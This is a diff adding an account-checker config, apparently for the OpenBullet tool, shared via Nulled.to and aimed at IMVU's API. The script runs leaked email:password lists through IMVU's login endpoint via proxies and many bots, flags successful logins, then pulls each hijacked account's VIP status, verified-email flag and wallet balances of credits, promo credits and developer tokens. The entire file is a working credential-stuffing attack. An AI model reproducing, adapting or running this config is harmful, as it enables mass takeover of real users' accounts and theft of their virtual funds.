@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "IMVU API",
+  "SuggestedBots": 35,
+  "LastModified": "2019-04-02T17:19:28.821144+02:00",
+  "AdditionalInfo": "Bogdan/Nulled.to",
+  "Author": "Bogdan",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.imvu.com/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: IMVU-Android/4.10.2.41002008 (samsung SM-A520F; Android v.5.1.1 API 22)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":\"failure\"" 
+PARSE "<SOURCE>" LR "\"user\":{\"id\":\"https://api.imvu.com/users/cid/" "\"" -> VAR "id" 
+REQUEST GET "https://api.imvu.com/user/user-<id>" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: IMVU-Android/4.10.2.41002008 (samsung SM-A520F; Android v.5.1.1 API 22)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\": \"success\"" 
+PARSE "<SOURCE>" LR "\"is_vip\": " "," -> CAP "VIP" 
+PARSE "<SOURCE>" LR "\"is_ap\": " "," -> CAP "AP" 
+PARSE "<SOURCE>" LR "\"is_creator\": " "," -> CAP "Creator" 
+PARSE "<SOURCE>" LR "\"is_email_verified\": " "," -> CAP "Verified Email" 
+REQUEST GET "https://api.imvu.com/wallet/wallet-<id>" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: IMVU-Android/4.10.2.41002008 (samsung SM-A520F; Android v.5.1.1 API 22)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"" 
+PARSE "<SOURCE>" LR "\"credits\":" "," -> CAP "Credits" 
+PARSE "<SOURCE>" LR "\"promo_credits\":" "," -> CAP "Promo Credits" 
+PARSE "<SOURCE>" LR "\"dev_tokens\":" "}" -> CAP "Dev Tokens" "" " [Bogdan/nulled.to]" 
